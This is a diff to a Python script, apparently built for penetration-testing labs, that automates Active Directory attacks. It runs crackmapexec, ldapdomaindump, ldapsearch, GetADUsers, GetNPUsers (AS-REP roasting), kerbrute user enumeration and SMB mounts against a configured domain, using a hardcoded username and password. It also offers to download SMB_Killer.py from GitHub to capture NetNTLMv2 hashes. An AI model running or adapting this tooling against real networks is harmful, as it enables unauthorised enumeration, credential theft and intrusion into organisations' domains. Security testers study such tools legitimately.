@@ -6,6 +6,7 @@ import sys
 import time
 import os.path
 import subprocess
+import shutil
 from subprocess import call
 import urllib.request
 from os import system
@@ -13,11 +14,11 @@ from os import system
 lhost = "10.10.0.16" #Your LHOST IP
 lport = "80" #Your web port (ex: 8080)
 inter = "tun0" #Your interface (ex: tun0 or eth0)
-domainip = "172.31.3.9" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
-domain = "spray.csl" #Domain name
-username = "johana" #if you have a username for the domain you are attacking insert here
+domainip = "172.31.3.8" #Domain IP you are attacking if you do not know do a crackmapexec smb <rhost ip> -u fjdkasf -p /usr/share/wordlists/rockyou.txt and it will show you the domain name
+domain = "toast" #Domain name
+username = "karen" #if you have a username for the domain you are attacking insert here
 userfile = "" #if you have a user file put here
-password = "johana" #if you have a password that goes along with the username put here
+password = "MANAGER" #if you have a password that goes along with the username put here
 passfile = "" #if you have a password file put here
 
 parser = argparse.ArgumentParser(description="Enum AD",
@@ -286,17 +287,18 @@ if (len(domain) == 0):
 	print("\033[1;31m Below you will see the domain name, please update in EnumAD.py\033[1;39m")
 	system("crackmapexec smb "+domainip+" -u fdsfaj -p fjdksaf")
 	quit()
+
 scan()
 search_word = "88"
 if search_word in open(domainip+"-rustscan.txt").read():
 	if (len(username) == 0) and (len(password) == 0 ):
 		ret_code=system("ls LDAP")
 		if ret_code != 0:
+			shutil.rmtree("LDAP")
 			system("mkdir LDAP")
-		os.chdir("LDAP")
 		system("ldapdomaindump "+domainip+"")
+		system("mv domain* LDAP/")
 		print("\033[1;31m Tried anonymous ldapdomaindump and put in LDAP folder\033[1;39m\n")
-		system("cd ..")
 	if (len(username) != 0) and (len(password) == 0):
 		userin = input("Is that a username or userfile? (u/uf):\n")
 		if userin == "u":
@@ -311,13 +313,14 @@ if search_word in open(domainip+"-rustscan.txt").read():
 		print("\033[1;31m Making directory LDAP and doing LDAP domain dump\033[1;39m\n")
 		sys = ""+domain+"/"+username+":"+password+" -dc-ip "+domainip+""
 		print("ldapdomaindump trying on "+domainip+" in domain "+domain+" with user "+username+" and password "+password+"")
+		shutil.rmtree("LDAP")
 		system("mkdir LDAP")
-		os.chdir("LDAP")
 		print("\033[1;31m Tried ldapdomaindump and put in LDAP folder\033[1;39m\n")
 		system("ldapdomaindump "+domainip+" -u "'"'+domain+'\\'+username+'"'" -p "+password+"")
+		system("mv domain* LDAP/")
 		print("")
 		print("\033[1;35m Opening firefox for ldapdomaindump, make sure to look at all pages\033[1;39m\n")
-		system("firefox *.html")
+		system("firefox LDAP/*.html")
 		print("\033[1;31m Testing GetADUsers.py\033[1;39m\n")
 		system("GetADUsers.py " +domain+"/"+username+":"+password+" -dc-ip "+domainip+"")
 		print("\033[1;32m Testing GetUsersSPNs.py\033[1;39m\n")
@@ -329,8 +332,27 @@ if search_word in open(domainip+"-rustscan.txt").read():
 		threads = input("How many threads would you like to run, higher is faster?")
 		system(ker+" userenum -d "+domain+" --dc "+domainip+" "+username+" -t "+threads+"")
 		system("GetNPUsers.py "+domainip+"/ -no-pass -usersfile "+userin+" -dc-ip "+domainip+"")
+print("\033[1;31m Trying LDAPSEARCH incase ldapdomaindump didn't work\033[1;39m\n")
+if (len(username) == 0) and (len(password) == 0 ):
+	print("\033[1;31m Trying LDAPSEARCH with no username or password\033[1;39m\n")
+	DC = input("\033[1;32m DC, for this we just need the first part, (ex: if DC is cyber.local then it would be cyber) \033[1;39m\n")
+	loc = input("\033[1;33m DC, for this we just need the second part of the FQDN (ex: local no period) \033[1;39m\n")
+	print("\033[1;31m Putting ldapsearch results into ldap.txt\033[1;39m\n")
+	system("ldapsearch -H ldap://"+domainip+" -x -b DC="+DC+",DC="+loc+' "(objectclass=person)" > ldap.txt')
+	print("\033[1;31m Looking in ldap.txt for description and samaccountname\033[1;39m\n")
+	system("cat ldap.txt | grep -i description")
+	system("cat ldap.txt | grep -i samaccountname")
+if (len(username) != 0 ) and (len(password) != 0 ):
+	print("\033[1;31m Trying LDAPSEARCH\033[1;39m\n")
+	DC = input("\033[1;32m DC, for this we just need the first part, (ex: if DC is cyber.local then it would be cyber) \033[1;39m\n")
+	loc = input("\033[1;33m DC, for this we just need the second part of the FQDN (ex: local no period) \033[1;39m\n")
+	print("\033[1;31m Putting ldapsearch results into ldap.txt\033[1;39m\n")
+	system("ldapsearch -H ldap://"+domainip+" -x -b DC="+DC+",DC="+loc+' "(objectclass=person)" -D '+username+' -w '+password+' > ldap.txt')
+	print("\033[1;31m Looking in ldap.txt for description and samaccountname\033[1;39m\n")
+	system("cat ldap.txt | grep -i description")
+	system("cat ldap.txt | grep -i samaccountname")
 
-print("\033[1;31m Testing anonymous login\033[1;39m\n")
+print("\033[1;31m Testing anonymous login on SMB Client\033[1;39m\n")
 system("smbclient -L \\\\"+domainip+"\\")
 if (len(username) != 0) and (len(password) !=0):
 	print("\033[1;35m Testing login with "+username+" and "+password+"\033[1;39m\n")
@@ -340,7 +362,7 @@ if (len(username) != 0) and (len(password) !=0):
 		system("mkdir tmp")
 		print("\033[1;31m Mounting SMB Share into tmp folder\033[1;39m\n")
 		system("sudo mount -t cifs //"+domainip+"/"+share+" -o user="+username+" tmp")
-		smbkiller = input("Do you want to download SMB_Killer.py and try to get NetNTLMv2 hash? (y/n)\n")
+		smbkiller = input("\033[1;35m Do you want to download SMB_Killer.py and try to get NetNTLMv2 hash? (y/n)\033[1;39m\n")
 		if smbkiller == "y":
 			print("\033[1;31m Downloading newest version of smbkiller from github\033[1;39m")
 			url = "https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.py"
@@ -359,7 +381,7 @@ if (len(username) != 0) and (len(password) !=0):
 				print("Not an option")
 		else:
 			"Not running smbkiller"
-		
+
 if args.scan == True:
 	scan()
 if args.SMBKiller == True:
